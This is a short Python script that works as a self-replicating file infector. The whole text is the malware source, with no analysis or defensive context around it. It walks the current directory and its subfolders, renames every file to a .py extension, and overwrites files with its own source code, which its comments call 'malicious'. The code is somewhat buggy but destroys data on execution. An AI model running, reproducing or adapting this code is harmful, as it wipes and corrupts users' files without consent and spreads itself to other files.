import os
import sys

class GeneralData:
    files = []
    directories = []
    mainPathFile = os.getcwd()

# Function for convert files to Python files
def ConvertFiles(dir):
    for i in os.listdir(dir):
        if '.' in i:
            try:
                os.rename(dir + '/' + '{}'.format(i) , dir + "/" + '{}.py'.format(i.split('.')[0]))
                GeneralData.files.append(i)
            except:
                continue
        else:
            GeneralData.directories.append(i)

# Find files in current directory and convert files to Python files
def FindAndConvert(dir):
    ConvertFiles(dir)

    for i in GeneralData.directories:
        try:
            print(GeneralData.mainPathFile + '/' + i)
            ConvertFiles(GeneralData.mainPathFile + '/' + i)
        except:
            continue
        ReadFileContent(GeneralData.files)
    
# Checking for is it changed already or not
def ReadFileContent(files):
    for file in files:
        try:
            with open(file , mode= 'r') as f:
                if f.read() == InfectedFileContent():
                    continue
                else:
                    ContentChanger(file)        
        except:
            continue

# Copy content of this script
def InfectedFileContent():
    with open(sys.argv[0] , mode='r') as f:
        maliciousContent = f.read()
    return maliciousContent

# Write malicious script to files
def ContentChanger(file):
    with open(file , mode= 'w') as f:
        f.write(InfectedFileContent())

def MainScript():
    FindAndConvert(GeneralData.mainPathFile)
    ReadFileContent(GeneralData.files)

MainScript()
